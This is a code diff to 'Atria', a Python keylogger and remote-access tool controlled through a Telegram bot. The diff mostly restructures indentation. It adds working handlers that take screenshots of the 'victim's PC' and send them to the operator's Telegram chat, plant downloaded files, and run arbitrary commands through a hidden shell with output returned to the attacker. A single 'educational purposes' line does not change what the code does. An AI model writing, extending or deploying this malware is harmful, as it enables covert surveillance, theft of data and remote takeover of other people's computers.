@@ -101,12 +101,6 @@ def log_message(message, log_type='keylog'):
 #                                  [Telegram Bot Functions & Commands]                                    #
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 
-def start_message():
-    send_message("Monitoring started!")
-    send_message("Thank you for using Atria!")
-    send_message("Use this script only for educational purposes!")
-    send_message("To list all commands, type /help in the chatbox.")
-
 bot_token, chat_id = load_configuration()
 
 try:
@@ -115,80 +109,86 @@ except Exception as e:
     log_message(f"Error initializing bot: {e}", 'error')
     bot = None
 
-    @retry_on_exception(requests.RequestException, retries=5, delay=2)
-    def send_message(message):
-        if bot:
-            bot.send_message(chat_id, message)
+@retry_on_exception(requests.RequestException, retries=5, delay=2)
+def send_message(message):
+    if bot:
+        bot.send_message(chat_id, message)
 
-    @retry_on_exception(requests.RequestException, retries=5, delay=2)
-    @bot.message_handler(commands=['help'])
-    def send_help(message):
-        help_message = (
-            "Atria Commands\n"
-            "/help - List available commands\n"
-            "/screenshot - Capture and send a screenshot\n"
-            "/upload - Upload file from victim's PC\n"
-            "/download - Download file from victim's PC\n"
-            "/shutdown - Execute shutdown to the victim's PC\n"
-            "/restart - Execute restart to the victim's PC\n"
-            "/shell <command> - Execute commands using a hidden shell"
-        )
-        bot.send_message(message.chat.id, help_message)
+def start_message():
+    send_message("Monitoring started!")
+    send_message("Thank you for using Atria!")
+    send_message("Use this script only for educational purposes!")
+    send_message("To list all commands, type /help in the chatbox.")
 
-    @retry_on_exception(requests.RequestException, retries=5, delay=2)
-    @bot.message_handler(commands=['screenshot'])
-    def send_photo(message):
-        if bot:
-            try:
-                screenshot = pyautogui.screenshot()
+@retry_on_exception(requests.RequestException, retries=5, delay=2)
+@bot.message_handler(commands=['help'])
+def send_help(message):
+    help_message = (
+        "Atria Commands\n"
+        "/help - List available commands\n"
+        "/screenshot - Capture and send a screenshot\n"
+        "/upload - Upload file from victim's PC\n"
+        "/download - Download file from victim's PC\n"
+        "/shutdown - Execute shutdown to the victim's PC\n"
+        "/restart - Execute restart to the victim's PC\n"
+        "/shell <command> - Execute commands using a hidden shell"
+    )
+    bot.send_message(message.chat.id, help_message)
 
-                buffer = io.BytesIO()
-                screenshot.save(buffer, format='PNG')
-                buffer.seek(0)
+@retry_on_exception(requests.RequestException, retries=5, delay=2)
+@bot.message_handler(commands=['screenshot'])
+def send_photo(message):
+    if bot:
+        try:
+            screenshot = pyautogui.screenshot()
 
-                url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
-                files = {'photo': ('screenshot.png', buffer, 'image/png')}
-                payload = {'chat_id': chat_id}
-                requests.post(url, params=payload, files=files)
-            except Exception as e:
-                log_message(f"Error in send_photo: {e}", 'error')
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='PNG')
+            buffer.seek(0)
 
-    @retry_on_exception(requests.RequestException, retries=5, delay=2)
-    @bot.message_handler(commands=['download'])
-    def download_file(message):
-        file_id = message.document.file_id
-        file_info = bot.get_file(file_id)
-        file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
-        file_name = message.document.file_name
-        with open(file_name, 'wb') as f:
-            f.write(requests.get(file_url).content)
-        bot.send_message(chat_id, f"File downloaded: {file_name}")
+            url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'
+            files = {'photo': ('screenshot.png', buffer, 'image/png')}
+            payload = {'chat_id': chat_id}
+            requests.post(url, params=payload, files=files)
+        except Exception as e:
+            log_message(f"Error in send_photo: {e}", 'error')
 
-    @retry_on_exception(requests.RequestException, retries=5, delay=2)
-    @bot.message_handler(commands=['shell'])
-    def shell_command(message):
-        global current_directory
+@retry_on_exception(requests.RequestException, retries=5, delay=2)
+@bot.message_handler(commands=['download'])
+def download_file(message):
+    file_id = message.document.file_id
+    file_info = bot.get_file(file_id)
+    file_url = f'https://api.telegram.org/file/bot{bot_token}/{file_info.file_path}'
+    file_name = message.document.file_name
+    with open(file_name, 'wb') as f:
+        f.write(requests.get(file_url).content)
+    bot.send_message(chat_id, f"File downloaded: {file_name}")
 
-        cmd = message.text[7:]
+@retry_on_exception(requests.RequestException, retries=5, delay=2)
+@bot.message_handler(commands=['shell'])
+def shell_command(message):
+    global current_directory
 
-        if cmd.startswith('cd '):
-            try:
-                new_directory = cmd[3:].strip()
-                os.chdir(new_directory)
-                current_directory = os.getcwd()
-                output = f"Changed directory to {current_directory}"
-            except Exception as e:
-                output = f"Error: {e}"
-        else:
-            try:
-                output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
-                output = output.decode('utf-8')
-            except subprocess.CalledProcessError as e:
-                output = f"Error: {e.output.decode('utf-8')}"
-            except Exception as e:
-                output = f"Error: {e}"
+    cmd = message.text[7:]
 
-        bot.send_message(message.chat.id, output)
+    if cmd.startswith('cd '):
+        try:
+            new_directory = cmd[3:].strip()
+            os.chdir(new_directory)
+            current_directory = os.getcwd()
+            output = f"Changed directory to {current_directory}"
+        except Exception as e:
+            output = f"Error: {e}"
+    else:
+        try:
+            output = subprocess.check_output(cmd, shell=True, cwd=current_directory)
+            output = output.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            output = f"Error: {e.output.decode('utf-8')}"
+        except Exception as e:
+            output = f"Error: {e}"
+
+    bot.send_message(message.chat.id, output)
 
 # ✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:* #
 #                                 [Continuation of Keylogger Functions]                                   #
